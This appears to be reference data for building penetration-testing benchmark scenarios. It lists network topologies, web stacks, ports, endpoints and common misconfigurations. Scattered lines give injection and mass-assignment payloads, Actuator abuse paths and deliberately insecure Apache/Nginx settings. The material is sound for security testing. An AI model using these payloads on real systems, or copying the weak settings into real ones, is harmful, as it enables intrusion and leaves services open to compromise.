# Corporate Network Topologies, Service Configurations & Web Application Architectures
## Reference Data for Procedural Scenario Generation (VAPT Benchmarks)

---

## 1. Common Corporate Network Topologies

### 1.1 Startup Topology (2-5 Hosts)

**Architecture Pattern:** Flat network, single subnet, cloud-hosted or small office.

| Host | Role | OS | Services | Ports |
|------|------|----|----------|-------|
| web-01 | Web/App Server | Ubuntu 22.04 / Amazon Linux 2 | Nginx + Node.js or Apache + PHP | 22/tcp (SSH), 80/tcp (HTTP), 443/tcp (HTTPS), 3000/tcp (Node dev) |
| db-01 | Database Server | Ubuntu 22.04 | MySQL 8.0 or PostgreSQL 15 or MongoDB 6.0 | 22/tcp (SSH), 3306/tcp (MySQL) or 5432/tcp (PostgreSQL) or 27017/tcp (MongoDB) |
| dev-01 | Developer Workstation | macOS / Ubuntu Desktop | VS Code Server, Docker, local services | 22/tcp (SSH), 8080/tcp (dev server), 9090/tcp (debug) |
| ci-01 (optional) | CI/CD + Git | Ubuntu 22.04 | Jenkins or GitLab CE | 22/tcp (SSH), 8080/tcp (Jenkins) or 80/443 (GitLab), 2222/tcp (GitLab SSH) |
| vpn-gw (optional) | VPN Gateway | Ubuntu 22.04 / pfSense | OpenVPN or WireGuard | 22/tcp (SSH), 1194/udp (OpenVPN) or 51820/udp (WireGuard) |

**Network Layout:**
```
Internet
    |
[Router/Firewall] (192.168.1.1)
    |
[Flat LAN: 192.168.1.0/24]
    |--- web-01    (192.168.1.10)
    |--- db-01     (192.168.1.11)
    |--- dev-01    (192.168.1.20)
    |--- ci-01     (192.168.1.30)
```

**Common Misconfigurations (Startup):**
- Database exposed to internet (no firewall rules filtering 3306/5432/27017)
- SSH with password authentication enabled (no key-only enforcement)
- Default credentials on Jenkins (admin/admin), GitLab root accounts
- No network segmentation — all hosts on same subnet
- Development services (Node debug port 9229, Flask debug 5000) exposed
- `.env` files accessible via web server misconfiguration
- Self-signed or expired TLS certificates
- No log aggregation or monitoring
- Docker daemon exposed on 2375/tcp without TLS
- MongoDB without authentication (pre-6.0 default)
- Redis without password on 6379/tcp accessible from any host
- Backup files (.sql.gz, .tar.gz) in web-accessible directories

---

### 1.2 SMB / E-commerce Topology (5-15 Hosts)

**Architecture Pattern:** Basic DMZ separation, possibly cloud VPC with public/private subnets.

| Host | Role | Subnet | OS | Services | Ports |
|------|------|--------|----|----------|-------|
| fw-01 | Firewall/Router | Edge | pfSense / OPNsense / AWS SG | Firewall, NAT, VPN | WAN, 443/tcp (mgmt), 1194/udp |
| web-01 | Public Web Server | DMZ | Ubuntu 22.04 | Nginx 1.24 reverse proxy | 80/tcp, 443/tcp |
| web-02 | Public Web Server (HA) | DMZ | Ubuntu 22.04 | Nginx 1.24 reverse proxy | 80/tcp, 443/tcp |
| app-01 | Application Server | Internal | Ubuntu 22.04 | Node.js 18 / PHP-FPM 8.2 / Tomcat 9 | 22/tcp, 8080/tcp, 3000/tcp |
| app-02 | Application Server (HA) | Internal | Ubuntu 22.04 | Node.js 18 / PHP-FPM 8.2 | 22/tcp, 8080/tcp |
| db-01 | Primary Database | Internal | Ubuntu 22.04 | MySQL 8.0 / PostgreSQL 15 | 22/tcp, 3306/tcp or 5432/tcp |
| db-02 | Replica Database | Internal | Ubuntu 22.04 | MySQL 8.0 replica | 22/tcp, 3306/tcp |
| cache-01 | Cache Server | Internal | Ubuntu 22.04 | Redis 7.0 / Memcached 1.6 | 22/tcp, 6379/tcp or 11211/tcp |
| mail-01 | Mail Server | DMZ | Ubuntu 22.04 | Postfix 3.7 + Dovecot 2.3 | 25/tcp, 143/tcp, 993/tcp, 587/tcp |
| file-01 | File/Backup Server | Internal | Ubuntu 22.04 / Windows Server 2022 | Samba 4.17 / NFS | 22/tcp, 445/tcp, 139/tcp, 2049/tcp |
| monitor-01 | Monitoring | Internal | Ubuntu 22.04 | Zabbix / Nagios / Prometheus + Grafana | 22/tcp, 3000/tcp (Grafana), 9090/tcp (Prometheus) |
| admin-01 | Admin Workstation | Internal | Windows 10/11 | RDP, admin tools | 3389/tcp |
| vpn-01 | VPN Gateway | Edge | Ubuntu 22.04 | OpenVPN 2.6 | 22/tcp, 1194/udp |

**Network Layout:**
```
Internet
    |
[fw-01] ---- [VPN Gateway vpn-01]
    |
    |--- DMZ (10.0.1.0/24)
    |       |--- web-01  (10.0.1.10)
    |       |--- web-02  (10.0.1.11)
    |       |--- mail-01 (10.0.1.20)
    |
    |--- Internal/App Tier (10.0.2.0/24)
    |       |--- app-01  (10.0.2.10)
    |       |--- app-02  (10.0.2.11)
    |
    |--- Internal/Data Tier (10.0.3.0/24)
    |       |--- db-01     (10.0.3.10)
    |       |--- db-02     (10.0.3.11)
    |       |--- cache-01  (10.0.3.20)
    |       |--- file-01   (10.0.3.30)
    |
    |--- Management (10.0.4.0/24)
            |--- monitor-01 (10.0.4.10)
            |--- admin-01   (10.0.4.20)
```

**Common Misconfigurations (SMB):**
- DMZ to internal network overly permissive firewall rules
- Web server directory listing enabled
- Database replication traffic unencrypted
- Mail server configured as open relay (no SMTP AUTH required)
- Missing SPF/DKIM/DMARC DNS records
- Samba shares with guest/anonymous access
- Redis without requirepass directive
- Memcached exposed without SASL authentication
- phpMyAdmin or Adminer exposed on app servers
- Backup scripts with hardcoded credentials
- SSL/TLS with weak cipher suites (RC4, DES, export ciphers)
- Missing HTTP security headers (HSTS, CSP, X-Frame-Options)
- WordPress/Magento/WooCommerce with outdated plugins
- Admin panels accessible from DMZ (should be management-only)
- Unencrypted NFS exports with no IP restrictions

---

### 1.3 Enterprise Topology (15-50 Hosts)

**Architecture Pattern:** Full segmentation with Active Directory, multiple security zones, defense-in-depth.

| Host | Role | Zone | OS | Services | Ports |
|------|------|------|----|----------|-------|
| **Edge/DMZ** | | | | | |
| fw-ext-01 | External Firewall | Edge | Palo Alto / Fortinet | Firewall, IPS, VPN | Various |
| fw-int-01 | Internal Firewall | Core | Palo Alto / Fortinet | Firewall, micro-segmentation | Various |
| lb-01 | Load Balancer | DMZ | F5 / HAProxy / AWS ALB | L7 load balancing, SSL termination | 80/tcp, 443/tcp, 8443/tcp (mgmt) |
| lb-02 | Load Balancer (HA) | DMZ | F5 / HAProxy | L7 load balancing | 80/tcp, 443/tcp |
| waf-01 | Web Application Firewall | DMZ | ModSecurity / AWS WAF | WAF rules | Inline |
| vpn-01 | VPN Concentrator | DMZ | Cisco AnyConnect / OpenVPN | Remote access VPN | 443/tcp (SSL VPN), 1194/udp |
| **Web Tier** | | | | | |
| web-01..04 | Web Servers | Web DMZ | RHEL 9 / Ubuntu 22.04 | Nginx 1.24 / Apache 2.4 | 80/tcp, 443/tcp |
| **Application Tier** | | | | | |
| app-01..04 | App Servers | App Zone | RHEL 9 | Tomcat 9.0 / JBoss EAP 7.4 / .NET 8 | 8080/tcp, 8443/tcp, 9990/tcp (JBoss mgmt) |
| api-01..02 | API Gateway | App Zone | Ubuntu 22.04 | Kong / Spring Cloud Gateway | 8000/tcp, 8443/tcp |
| mq-01 | Message Queue | App Zone | RHEL 9 | RabbitMQ 3.12 / Apache Kafka 3.6 | 5672/tcp (AMQP), 15672/tcp (mgmt), 9092/tcp (Kafka) |
| **Data Tier** | | | | | |
| db-01 | Primary DB (RDBMS) | Data Zone | RHEL 9 | Oracle 19c / SQL Server 2022 / PostgreSQL 15 | 1521/tcp (Oracle), 1433/tcp (MSSQL), 5432/tcp (PG) |
| db-02 | Replica/Standby DB | Data Zone | RHEL 9 | Same as primary | Same as primary |
| db-03 | NoSQL Database | Data Zone | Ubuntu 22.04 | MongoDB 6.0 / Elasticsearch 8.x | 27017/tcp, 9200/tcp (ES), 9300/tcp (ES cluster) |
| cache-01..02 | Cache Cluster | Data Zone | Ubuntu 22.04 | Redis 7.0 Cluster / Memcached 1.6 | 6379/tcp, 16379/tcp (Redis cluster bus), 11211/tcp |
| **Identity & Directory** | | | | | |
| dc-01 | Domain Controller (Primary) | Identity Zone | Windows Server 2022 | AD DS, DNS, LDAP, Kerberos | 53/tcp+udp, 88/tcp+udp, 135/tcp, 389/tcp+udp, 445/tcp, 464/tcp, 636/tcp, 3268/tcp, 3269/tcp |
| dc-02 | Domain Controller (Secondary) | Identity Zone | Windows Server 2022 | AD DS, DNS (replica) | Same as dc-01 |
| ca-01 | Certificate Authority | Identity Zone | Windows Server 2022 | AD CS (Enterprise CA) | 135/tcp, 443/tcp (CES/CEP) |
| adfs-01 | Federation Services | Identity Zone | Windows Server 2022 | AD FS, SAML/OIDC | 443/tcp |
| **Management/DevOps** | | | | | |
| jump-01 | Jump Box / Bastion | Mgmt Zone | Ubuntu 22.04 / Windows Server 2022 | SSH / RDP gateway | 22/tcp, 3389/tcp |
| siem-01 | SIEM | Mgmt Zone | RHEL 9 | Splunk / Elastic SIEM / QRadar | 8000/tcp (Splunk web), 8089/tcp (Splunk mgmt), 9997/tcp (Splunk forwarder), 514/tcp+udp (syslog) |
| monitor-01 | Monitoring | Mgmt Zone | Ubuntu 22.04 | Nagios / Zabbix / Prometheus + Grafana | 80/tcp, 3000/tcp, 5666/tcp (NRPE), 9090/tcp |
| log-01 | Log Aggregator | Mgmt Zone | Ubuntu 22.04 | Graylog / ELK Stack | 9000/tcp (Graylog web), 12201/tcp+udp (GELF), 5044/tcp (Beats) |
| ci-01 | CI/CD Server | DevOps Zone | Ubuntu 22.04 | Jenkins 2.4x / GitLab CI | 8080/tcp (Jenkins), 443/tcp (GitLab), 50000/tcp (Jenkins agents) |
| repo-01 | Artifact Repository | DevOps Zone | Ubuntu 22.04 | Nexus 3 / Artifactory | 8081/tcp, 8082/tcp (Docker registry) |
| ansible-01 | Config Management | DevOps Zone | Ubuntu 22.04 | Ansible AWX / Tower | 22/tcp, 443/tcp (AWX web) |
| **User Workstations** | | | | | |
| ws-01..10 | Employee Workstations | User Zone | Windows 10/11 Enterprise | Domain-joined, Office 365, browser | 135/tcp, 445/tcp, 3389/tcp (if enabled) |
| **File & Print** | | | | | |
| fs-01 | File Server | Internal | Windows Server 2022 | SMB shares, DFS | 445/tcp, 139/tcp, 135/tcp |
| print-01 | Print Server | Internal | Windows Server 2022 | Print spooler, IPP | 445/tcp, 631/tcp (IPP), 9100/tcp (RAW) |
| **Mail** | | | | | |
| mail-01 | Exchange / Mail Gateway | DMZ | Windows Server 2022 / Linux | Exchange 2019 / Postfix + Dovecot | 25/tcp, 443/tcp (OWA), 587/tcp, 993/tcp, 995/tcp |

**Network Layout:**
```
Internet
    |
[fw-ext-01] ---- [vpn-01]
    |
    |--- DMZ / Web Tier (10.10.1.0/24)
    |       |--- lb-01, lb-02 (10.10.1.10-11)
    |       |--- waf-01 (10.10.1.20)
    |       |--- web-01..04 (10.10.1.30-33)
    |       |--- mail-01 (10.10.1.40)
    |
[fw-int-01]
    |
    |--- Application Tier (10.10.2.0/24)
    |       |--- app-01..04 (10.10.2.10-13)
    |       |--- api-01..02 (10.10.2.20-21)
    |       |--- mq-01 (10.10.2.30)
    |
    |--- Data Tier (10.10.3.0/24)
    |       |--- db-01..03 (10.10.3.10-12)
    |       |--- cache-01..02 (10.10.3.20-21)
    |
    |--- Identity Zone (10.10.4.0/24)
    |       |--- dc-01, dc-02 (10.10.4.10-11)
    |       |--- ca-01 (10.10.4.20)
    |       |--- adfs-01 (10.10.4.30)
    |
    |--- Management Zone (10.10.5.0/24)
    |       |--- jump-01 (10.10.5.10)
    |       |--- siem-01 (10.10.5.20)
    |       |--- monitor-01 (10.10.5.21)
    |       |--- log-01 (10.10.5.22)
    |
    |--- DevOps Zone (10.10.6.0/24)
    |       |--- ci-01 (10.10.6.10)
    |       |--- repo-01 (10.10.6.20)
    |       |--- ansible-01 (10.10.6.30)
    |
    |--- User Zone (10.10.10.0/23)
    |       |--- ws-01..10 (10.10.10.20-29)
    |
    |--- Internal Services (10.10.7.0/24)
            |--- fs-01 (10.10.7.10)
            |--- print-01 (10.10.7.20)
```

**Common Misconfigurations (Enterprise):**
- Kerberoastable service accounts with weak passwords
- AS-REP Roasting (accounts without pre-authentication)
- Unconstrained delegation on computer accounts
- Group Policy Preferences (GPP) with embedded credentials (legacy)
- LLMNR/NBT-NS/mDNS poisoning possible on user VLANs
- SMB signing not required (NTLM relay attacks)
- Domain admin credentials cached on workstations
- Overly permissive ACLs in Active Directory (GenericAll, WriteDACL)
- Print Spooler service enabled on domain controllers (PrintNightmare)
- Weak NTLM in use instead of Kerberos
- ADCS misconfigured templates (ESC1-ESC8 vulnerabilities)
- JBoss/WebLogic management consoles accessible from app tier
- Elasticsearch with no authentication (X-Pack security disabled)
- RabbitMQ management UI with default guest/guest
- Jenkins with unauthenticated script console
- Splunk with default changeme password
- Overly broad firewall rules between zones
- Missing micro-segmentation within zones
- Stale DNS entries pointing to decommissioned hosts
- Service accounts in Domain Admins group unnecessarily
- Unpatched Exchange server (ProxyLogon/ProxyShell)

---

## 2. Common Web Application Stacks

### 2.1 LAMP Stack (Linux, Apache, MySQL, PHP)

**Typical Ports:**
| Service | Port | Banner Example |
|---------|------|----------------|
| Apache HTTP | 80/tcp | `Apache/2.4.57 (Ubuntu)` |
| Apache HTTPS | 443/tcp | `Apache/2.4.57 (Ubuntu) OpenSSL/3.0.10` |
| MySQL | 3306/tcp | `5.7.42-0ubuntu0.18.04.1` or `8.0.34-0ubuntu0.22.04.1` |
| PHP-FPM | 9000/tcp (internal) | Not externally visible typically |
| SSH | 22/tcp | `OpenSSH_8.9p1 Ubuntu-3ubuntu0.4` |
| phpMyAdmin | 80/tcp path: /phpmyadmin | Via Apache |

**Common Endpoints:**
```
/                           # Homepage
/index.php                  # Main entry point
/wp-admin/                  # WordPress admin (if WP)
/wp-login.php               # WordPress login
/wp-content/uploads/        # WordPress uploads
/administrator/             # Joomla admin
/admin/                     # Generic admin panel
/phpmyadmin/                # phpMyAdmin
/server-status              # Apache mod_status
/server-info                # Apache mod_info
/info.php                   # phpinfo() page
/config.php                 # Configuration file
/backup/                    # Backup directory
/.env                       # Environment variables
/.git/                      # Exposed git repository
/api/                       # API root
/api/v1/users               # User API
/uploads/                   # File uploads directory
/includes/                  # PHP includes (should be blocked)
/cgi-bin/                   # CGI scripts
```

**Common Parameters:**
```
?id=1                       # Record identifier (SQL injection target)
?page=about                 # Page include (LFI/RFI target)
?file=report.pdf            # File access (path traversal target)
?search=term                # Search query (XSS/SQLi target)
?cat=electronics            # Category filter
?sort=price&order=asc       # Sorting parameters
?lang=en                    # Language selector (LFI target)
?redirect=https://...       # Redirect URL (open redirect target)
?action=delete&id=5         # Action parameter (CSRF target)
?debug=true                 # Debug mode toggle
?template=default           # Template selection (SSTI target)
```

**Common Misconfigurations:**
- `ServerTokens Full` exposing exact version
- `AllowOverride None` preventing .htaccess security rules
- `display_errors = On` in production
- `allow_url_include = On` in php.ini
- phpMyAdmin accessible without IP restriction
- `/server-status` and `/server-info` publicly accessible
- `.git` directory exposed
- Directory listing via `Options +Indexes`
- `mod_cgi` enabled with writable cgi-bin
- MySQL root with empty password or accessible from `%` host

---

### 2.2 MEAN Stack (MongoDB, Express, Angular, Node.js)

**Typical Ports:**
| Service | Port | Banner/Identification |
|---------|------|-----------------------|
| Node.js/Express HTTP | 3000/tcp or 8080/tcp | `Express` (X-Powered-By header) |
| Node.js/Express HTTPS | 443/tcp | Via reverse proxy typically |
| Nginx (reverse proxy) | 80/tcp, 443/tcp | `nginx/1.24.0` |
| MongoDB | 27017/tcp | `MongoDB 6.0.x` |
| MongoDB HTTP status | 28017/tcp (legacy) | Web status page |
| Node.js debugger | 9229/tcp | V8 inspector protocol |
| Angular dev server | 4200/tcp | Webpack dev server |
| SSH | 22/tcp | `OpenSSH_8.9p1` |

**Common Endpoints:**
```
/                           # SPA entry point (serves index.html)
/api/                       # API root
/api/v1/auth/login          # JWT authentication
/api/v1/auth/register       # User registration
/api/v1/auth/refresh        # Token refresh
/api/v1/auth/forgot-password # Password reset
/api/v1/users               # Users CRUD
/api/v1/users/:id           # Single user
/api/v1/users/me            # Current user profile
/api/v1/products            # Products listing
/api/v1/orders              # Orders
/api/v1/upload              # File upload
/api/v1/search              # Search endpoint
/api/docs                   # Swagger/OpenAPI documentation
/api/health                 # Health check
/api/graphql                # GraphQL endpoint (if used)
/socket.io/                 # WebSocket endpoint
/admin/                     # Admin SPA route
/.well-known/               # Well-known URIs
```

**Common Parameters:**
```
# Query parameters
?page=1&limit=20            # Pagination
?sort=-createdAt            # Sort (MongoDB style)
?fields=name,email          # Field selection
?search=keyword             # Search
?filter[status]=active      # Filtered queries
?populate=author            # Relation population (NoSQL injection target)
?where={"role":"admin"}     # Direct MongoDB query (NoSQLi target)
?$gt=                       # MongoDB operator injection

# JSON body parameters
{"username": "...", "password": "..."}                  # Login
{"email": "...", "password": "...", "role": "user"}     # Registration (mass assignment)
{"$gt": ""}                                             # NoSQL injection in body
{"__proto__": {"admin": true}}                          # Prototype pollution
```

**Common Misconfigurations:**
- `X-Powered-By: Express` header not disabled
- MongoDB without authentication (bindIp: 0.0.0.0, no auth)
- Node.js debugger port (9229) exposed
- CORS set to `Access-Control-Allow-Origin: *`
- JWT secret weak or default (`secret`, `changeme`)
- No rate limiting on API endpoints
- Stack traces returned in production error responses
- `npm` debug/dev dependencies in production
- Environment variables in client-side Angular code
- Server-Side Request Forgery via URL parameters
- Prototype pollution via `__proto__` or `constructor.prototype`
- NoSQL injection via MongoDB operator injection (`$gt`, `$ne`, `$regex`)

---

### 2.3 Django + PostgreSQL

**Typical Ports:**
| Service | Port | Banner/Identification |
|---------|------|-----------------------|
| Nginx (reverse proxy) | 80/tcp, 443/tcp | `nginx/1.24.0` |
| Gunicorn/uWSGI | 8000/tcp (internal) | Not typically exposed |
| Django dev server | 8000/tcp | `WSGIServer/0.2 CPython/3.11.x` |
| PostgreSQL | 5432/tcp | `PostgreSQL 15.4` |
| Celery/Redis | 6379/tcp | `Redis 7.0.x` (task queue backend) |
| RabbitMQ | 5672/tcp | AMQP 0-9-1 |
| SSH | 22/tcp | `OpenSSH_8.9p1` |

**Common Endpoints:**
```
/                           # Homepage
/admin/                     # Django admin (built-in)
/admin/login/               # Django admin login
/accounts/login/            # Django allauth login
/accounts/signup/           # Registration
/accounts/password/reset/   # Password reset
/api/                       # DRF API root
/api/v1/                    # Versioned API
/api/v1/users/              # User listing
/api/v1/users/<pk>/         # User detail
/api/v1/token/              # JWT token obtain (SimpleJWT)
/api/v1/token/refresh/      # JWT refresh
/api/schema/                # OpenAPI schema
/api/docs/                  # Swagger UI
/api/redoc/                 # ReDoc documentation
/static/                    # Static files
/media/                     # User uploaded media
/health/                    # Health check
/sitemap.xml                # Sitemap
/robots.txt                 # Robots file
/__debug__/                 # Django Debug Toolbar (dev)
```

**Common Parameters:**
```
# URL query params (Django REST Framework)
?format=json                # Response format (also api, html)
?page=1&page_size=20        # Pagination
?search=keyword             # Search filter
?ordering=-created_at       # Ordering
?fields=id,name,email       # Sparse fields
?expand=profile             # Nested serializer expansion
?username=admin             # Filter by field
?created_at__gte=2024-01-01 # Django ORM lookup (date range)
?status__in=active,pending  # Multiple value filter

# POST/PUT body (JSON)
{"username": "...", "password": "...", "csrfmiddlewaretoken": "..."}
```

**Common Misconfigurations:**
- `DEBUG = True` in production (exposes settings, traceback, SQL queries)
- Django Debug Toolbar accessible in production
- `SECRET_KEY` committed in source or using default
- `ALLOWED_HOSTS = ['*']`
- Django admin on default `/admin/` path without IP restriction
- `CORS_ALLOW_ALL_ORIGINS = True`
- Missing CSRF middleware (or exempt decorators overused)
- Database credentials in `settings.py` committed to git
- Weak session cookie settings (missing `Secure`, `HttpOnly`)
- Static/media file serving via Django (not Nginx) in production
- Unrestricted file upload types
- Django REST Framework browsable API enabled in production
- PostgreSQL with `trust` authentication in pg_hba.conf

---

### 2.4 Spring Boot + Java

**Typical Ports:**
| Service | Port | Banner/Identification |
|---------|------|-----------------------|
| Spring Boot HTTP | 8080/tcp | `Whitelabel Error Page` (default error) |
| Spring Boot HTTPS | 8443/tcp | Custom or embedded Tomcat |
| Embedded Tomcat | 8080/tcp | `Apache-Coyote/1.1` or `Apache Tomcat/9.0.x` |
| Standalone Tomcat | 8080/tcp | `Apache Tomcat/9.0.80` |
| Tomcat AJP | 8009/tcp | AJP/1.3 protocol |
| JMX/RMI | 1099/tcp, 9010/tcp | Java RMI |
| JDWP (Debug) | 5005/tcp | Java Debug Wire Protocol |
| PostgreSQL/MySQL | 5432/tcp or 3306/tcp | DB backend |
| SSH | 22/tcp | `OpenSSH_8.9p1` |

**Common Endpoints:**
```
/                               # Root
/login                          # Spring Security login
/logout                         # Logout
/actuator                       # Spring Boot Actuator root
/actuator/health                # Health check
/actuator/info                  # App info
/actuator/env                   # Environment properties (SENSITIVE)
/actuator/configprops           # Configuration properties (SENSITIVE)
/actuator/beans                 # Application beans
/actuator/mappings              # URL mappings
/actuator/metrics               # Metrics
/actuator/threaddump            # Thread dump
/actuator/heapdump              # Heap dump (CRITICAL - memory dump)
/actuator/loggers               # Logger configuration (can modify log levels)
/actuator/shutdown              # Shutdown endpoint (if enabled, CRITICAL)
/actuator/jolokia               # JMX over HTTP (RCE possible)
/actuator/gateway/routes        # Spring Cloud Gateway routes
/swagger-ui.html                # Swagger UI (older)
/swagger-ui/index.html          # Swagger UI (newer)
/v2/api-docs                    # Swagger 2.0 spec
/v3/api-docs                    # OpenAPI 3.0 spec
/api/v1/**                      # API endpoints
/h2-console/                    # H2 Database console (dev)
/console/                       # H2 or other DB console
/manager/html                   # Tomcat Manager (standalone)
/host-manager/html              # Tomcat Host Manager
/jolokia/                       # Jolokia JMX endpoint
/error                          # Default error page
```

**Common Parameters:**
```
# Query parameters
?page=0&size=20&sort=id,desc    # Spring Data pagination
?search=keyword                  # Search
?filter=status:active            # Custom filters
?projection=summary              # Spring Data REST projections
?username=admin                  # Filter fields

# Actuator abuse
/actuator/env (POST)            # Can set environment properties
/actuator/restart (POST)        # Restart the application
/actuator/loggers/ROOT (POST)   # Change log level: {"configuredLevel": "DEBUG"}
/jolokia/exec/...               # Execute MBeans (potential RCE)
```

**Common Misconfigurations:**
- Spring Boot Actuator endpoints exposed without authentication
- `/actuator/heapdump` accessible (contains credentials, tokens, secrets)
- `/actuator/env` exposing database passwords, API keys
- `/actuator/jolokia` or `/jolokia` enabling RCE via MBeans
- `/actuator/gateway/routes` allowing SSRF via Spring Cloud Gateway (CVE-2022-22947)
- H2 console enabled in production (`spring.h2.console.enabled=true`)
- JDWP debug port (5005) accessible
- Tomcat AJP connector exposed (GhostCat CVE-2020-1938)
- Tomcat Manager with default/weak credentials (tomcat/tomcat, admin/admin)
- Spring Boot DevTools active in production (remote code execution)
- Deserialization vulnerabilities in older Jackson/Java versions
- `server.error.include-stacktrace=always` in production
- JMX/RMI exposed without authentication
- Default Spring Security in-memory user with generated password logged at startup

---

### 2.5 Rails + PostgreSQL

**Typical Ports:**
| Service | Port | Banner/Identification |
|---------|------|-----------------------|
| Nginx (reverse proxy) | 80/tcp, 443/tcp | `nginx/1.24.0` |
| Puma/Unicorn | 3000/tcp (internal) | `Puma 6.x`, `X-Powered-By: Phusion Passenger` |
| Rails dev server | 3000/tcp | `WEBrick/1.8.1` |
| PostgreSQL | 5432/tcp | `PostgreSQL 15.4` |
| Redis (Sidekiq/ActionCable) | 6379/tcp | `Redis 7.0.x` |
| SSH | 22/tcp | `OpenSSH_8.9p1` |

**Common Endpoints:**
```
/                               # Root
/users/sign_in                  # Devise login
/users/sign_up                  # Devise registration
/users/password/new             # Password reset
/users/confirmation/new         # Email confirmation
/admin/                         # ActiveAdmin or RailsAdmin
/rails/info/routes              # Route listing (dev mode)
/rails/info/properties          # Rails properties (dev mode)
/rails/mailers                  # Mailer previews (dev mode)
/api/v1/                        # API namespace
/api/v1/sessions                # Session/auth API
/api/v1/users                   # Users resource
/api/v1/users/:id               # User detail
/sidekiq/                       # Sidekiq web UI
/cable                          # ActionCable WebSocket
/assets/                        # Asset pipeline
/uploads/                       # CarrierWave/ActiveStorage uploads
/graphql                        # GraphQL endpoint (if used)
/health                         # Health check
/.well-known/                   # Well-known URIs
```

**Common Parameters:**
```
# Query parameters
?page=1&per_page=25             # Kaminari/will_paginate
?q[name_cont]=john              # Ransack search
?q[created_at_gteq]=2024-01-01  # Ransack date filter
?sort=name&direction=asc        # Sorting
?format=json                    # Response format

# Form/JSON body (mass assignment targets)
user[name]=...&user[email]=...&user[role]=admin     # Mass assignment
user[admin]=true                                     # Privilege escalation
authenticity_token=...                               # CSRF token
```

**Common Misconfigurations:**
- `config.consider_all_requests_local = true` in production
- `config.action_dispatch.show_exceptions = false` in production
- Rails debug mode exposing full stack traces and source
- Secret key base committed in `secrets.yml` or `credentials.yml.enc` key in repo
- Mass assignment vulnerabilities (strong parameters bypass)
- Sidekiq web UI without authentication
- `/rails/info/routes` accessible (leaks all routes)
- `force_ssl` not set in production
- Default ActiveAdmin credentials (admin@example.com / password)
- Unscoped `find` calls allowing IDOR
- Raw SQL queries vulnerable to injection (bypassing ActiveRecord)
- Insecure direct object references in resource routes
- Missing `protect_from_forgery` in API controllers

---

### 2.6 .NET + SQL Server

**Typical Ports:**
| Service | Port | Banner/Identification |
|---------|------|-----------------------|
| IIS HTTP | 80/tcp | `Microsoft-IIS/10.0` |
| IIS HTTPS | 443/tcp | `Microsoft-IIS/10.0` |
| Kestrel (.NET Core) | 5000/tcp (HTTP), 5001/tcp (HTTPS) | `Kestrel` |
| SQL Server | 1433/tcp | `Microsoft SQL Server 2022` |
| SQL Server Browser | 1434/udp | SQL Server resolution |
| RDP | 3389/tcp | `Microsoft Terminal Services` |
| WinRM | 5985/tcp (HTTP), 5986/tcp (HTTPS) | Windows Remote Management |
| SMB | 445/tcp | `Microsoft SMB` |
| .NET Remoting | 9090/tcp | Various |

**Common Endpoints:**
```
/                               # Default page
/default.aspx                   # ASP.NET WebForms default
/login.aspx                     # WebForms login
/Account/Login                  # MVC login
/Identity/Account/Login         # ASP.NET Core Identity
/Identity/Account/Register      # Registration
/Identity/Account/ForgotPassword # Password reset
/api/                           # Web API root
/api/v1/                        # Versioned API
/api/values                     # Default Web API controller
/api/users                      # Users endpoint
/odata/                         # OData endpoint
/signalr/                       # SignalR hub
/swagger/                       # Swagger UI
/swagger/v1/swagger.json        # OpenAPI spec
/elmah.axd                      # ELMAH error log
/trace.axd                      # ASP.NET trace
/web.config                     # Configuration (should be blocked)
/bin/                           # Compiled assemblies
/App_Data/                      # Application data
/health                         # Health check
/hangfire                       # Hangfire dashboard (background jobs)
/_blazor                        # Blazor SignalR endpoint
```

**Common Parameters:**
```
# Query parameters
?id=1                           # Record identifier
?$filter=Name eq 'value'        # OData filter
?$select=Id,Name                # OData field selection
?$expand=Orders                 # OData navigation property
?$orderby=Name desc             # OData ordering
?$top=10&$skip=0                # OData pagination
?ReturnUrl=/admin               # Return URL (open redirect)
?page=1&pageSize=20             # Custom pagination
?handler=Delete                 # Razor Pages handler
?culture=en-US                  # Culture/locale

# Form body
__RequestVerificationToken=...  # Anti-forgery token
__VIEWSTATE=...                 # WebForms ViewState (deserialize target)
__EVENTVALIDATION=...           # WebForms event validation
```

**Common Misconfigurations:**
- `customErrors mode="Off"` exposing stack traces (web.config)
- `<compilation debug="true"/>` in production
- ViewState without MAC validation (deserialization attacks)
- IIS short filename disclosure (~1 vulnerability)
- ELMAH error log (`/elmah.axd`) publicly accessible
- ASP.NET trace (`/trace.axd`) enabled
- Directory browsing enabled in IIS
- WebDAV enabled on IIS
- SQL Server `sa` account with weak password
- SQL Server `xp_cmdshell` enabled
- Mixed mode authentication on SQL Server
- Connection strings in web.config with plaintext passwords
- Hangfire dashboard without authentication
- Default machine key in web.config (padding oracle, ViewState RCE)
- Missing `X-Frame-Options` and `Content-Security-Policy` headers
- WinRM accessible from external network

---

## 3. Common Service Configurations

### 3.1 Web Servers

#### Apache HTTP Server
| Property | Value |
|----------|-------|
| Default Port | 80/tcp (HTTP), 443/tcp (HTTPS) |
| Config Path | `/etc/apache2/` (Debian) or `/etc/httpd/` (RHEL) |
| Version Banners | `Apache/2.4.57 (Ubuntu)`, `Apache/2.4.57 (Red Hat Enterprise Linux)` |
| Status Page | `/server-status` (mod_status), `/server-info` (mod_info) |
| Common Modules | mod_ssl, mod_rewrite, mod_proxy, mod_php, mod_security, mod_headers |

**Misconfigurations:**
```apache
# Version disclosure
ServerTokens Full                    # Shows full version + OS + modules
ServerSignature On                   # Shows version in error pages

# Directory listing
Options +Indexes                     # Lists directory contents

# Sensitive endpoints exposed
<Location /server-status>
    # No Require ip restriction
</Location>

# Dangerous modules
LoadModule cgi_module                # CGI execution
LoadModule dav_module                # WebDAV write access

# Weak SSL/TLS
SSLProtocol all                      # Includes SSLv3, TLSv1.0
SSLCipherSuite ALL                   # Includes weak ciphers

# Missing security headers
# No Header set X-Frame-Options
# No Header set Content-Security-Policy
# No Header set X-Content-Type-Options
```

#### Nginx
| Property | Value |
|----------|-------|
| Default Port | 80/tcp (HTTP), 443/tcp (HTTPS) |
| Config Path | `/etc/nginx/nginx.conf`, `/etc/nginx/sites-enabled/` |
| Version Banners | `nginx/1.24.0`, `nginx/1.25.3` |
| Status Page | `/nginx_status` (stub_status module) |

**Misconfigurations:**
```nginx
# Version disclosure
server_tokens on;                    # Shows version in headers/error pages

# Alias traversal
location /static {
    alias /var/www/static/;          # Missing trailing slash = path traversal
}

# Off-by-slash
location /internal/ {
    proxy_pass http://backend;       # Missing trailing slash = path confusion
}

# Merge slashes
merge_slashes off;                   # Can bypass location-based access controls

# SSRF via proxy
location /proxy {
    proxy_pass http://$arg_url;      # User-controlled proxy destination
}

# Missing rate limiting
# No limit_req_zone defined

# Exposed stub_status
location /nginx_status {
    stub_status;                     # No access restriction
}
```

#### IIS (Internet Information Services)
